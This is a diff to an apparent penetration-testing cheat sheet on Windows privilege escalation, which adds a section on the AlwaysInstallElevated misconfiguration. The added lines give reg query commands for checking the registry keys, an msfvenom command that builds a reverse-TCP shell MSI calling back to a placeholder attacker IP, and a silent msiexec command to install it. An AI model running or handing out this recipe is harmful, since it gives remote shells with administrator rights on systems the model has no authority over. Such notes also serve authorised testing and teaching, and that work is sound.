@@ -173,5 +173,17 @@ You can cache creds through runas on windows systems which will allow anyone to 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>Drives\Drives.xml: Element-Specific Attributes</code>
  
 &nbsp;&nbsp;&nbsp;&nbsp;<code>DataSources\DataSources.xml: Element-Specific Attributes</code>
+ 
+### Elevated software install
+ 
+If the following registry keys contain "AlwaysInstallElevated" value 0x1, then any MSI run will run as admin. For exmaple: 
 
-&nbsp;&nbsp;&nbsp;&nbsp;<code>\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies</code>
+&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code> or
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>
+
+then create an install package:
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=Your_port -f msi -o shell.msi</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>msiexec /quiet /qn /i C:\Temp\shell.msi</code>
